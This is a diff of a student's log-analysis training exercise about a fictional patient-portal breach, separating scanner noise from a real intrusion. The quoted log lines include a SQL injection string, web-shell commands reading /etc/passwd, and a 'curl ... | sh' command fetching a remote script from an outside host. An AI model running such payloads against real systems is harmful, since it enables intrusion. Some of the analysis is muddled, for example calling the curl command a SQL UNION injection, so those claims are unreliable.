@@ -1,15 +1,15 @@
-# Week 7 Challenge - Reading web server logs to separate noise from a real attack, and proving whether it attacke suceeded.
+# Week 7 Challenge - Reading web server logs to separate noise from a real attack, and proving whether it succeeded
 
 ## Ticket
-- Web server, patient portal had a 'busy night' and a few odd requests but nothing alerted.
+- Web server, patient portal had a 'busy night' and a few odd requests but nothing alerted
 
 ### What we know
 - Normal response byte is about 1 KB
   
 ### Aproved activeties
-- 192.0.2.10 scanning system and 10.0.0.15 load balancer health checker.
+- 192.0.2.10 scanning system and 10.0.0.15 load balancer health checker
 
-## NB; Vendors, domains, and IP addresses are fictional and used for training only.
+## NB; Vendors, domains, and IP addresses are fictional and used for training only
 
 ### Web server log
 ```
@@ -52,14 +52,14 @@ Time Source IP Session user Request Status Bytes Client
 
 -	A noise created by by weekly vulnerability scan => 03:02:14 192.0.2.10 - GET /uploads/test.php 404 196 NW-VulnScan/2.1
 
--	A malicious activity trying to get admin config file => 02:11:04 203.0.113.50 - GET /admin/config.php 403 153 Go-http-client/1.1
+-	A malicious activity trying to get admin config file => 02:11:04 203.0.113.50 - GET /admin/config.php 403 153 Go-http-client/1.1, - 203.0.113.50 got only 404s and 403 which are noise not a real attack that worked
 
--	Malicious activity running a script on the server => 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
+-	Malicious activity running a script on the server => At 04:42:05 203.0.113.171 - GET /public/status?ref=NW83421%27%20OR%20%271%27=%271 200 482,311 python-requests/2.31.0, this request returned 482,311 bytes which excceeds the normal response of 1kb. At 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0 ran an SQL UNION SELECT ingustion on the server. And at 04:45:51 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑙𝑜𝑔𝑖𝑛 302 0 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0 logged in as admin which made it possible to upload a file at 04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0 and ran a command at 04:47:40 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=id 200 54 python-requests/2.31.0.
 
 ## Deliverable 2:
 
 ### Did it work?
-- Yes the attack worked. This was possible from 203.0.113.171 attack from admin login portal and successfully uploading a python code as patient appointment which gave access to where patient passwords are stored (/etc/passwd) and running script on the server which granted access login.
+- Yes the attack worked. This was possible from 203.0.113.171 attack from admin login portal and successfully uploading a PHP file which gave access to /etc/passwd lists the server's account.
 
 ### Quoted line of action:
 -	04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
@@ -67,6 +67,8 @@ Time Source IP Session user Request Status Bytes Client
 -	04:48:05 203.0.113.171 - GET /uploads/img3391.𝑝ℎ𝑝?𝑐=𝑐𝑎𝑡%20/𝑒𝑡𝑐/𝑝𝑎𝑠𝑠𝑤𝑑 200 1,873 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
 
 -	04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
+
+-	One thing the logs can't tell you was that at 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0 the command succeeded with a 200 0 bytes request accepted
 
 ## Deliverable 3:
 
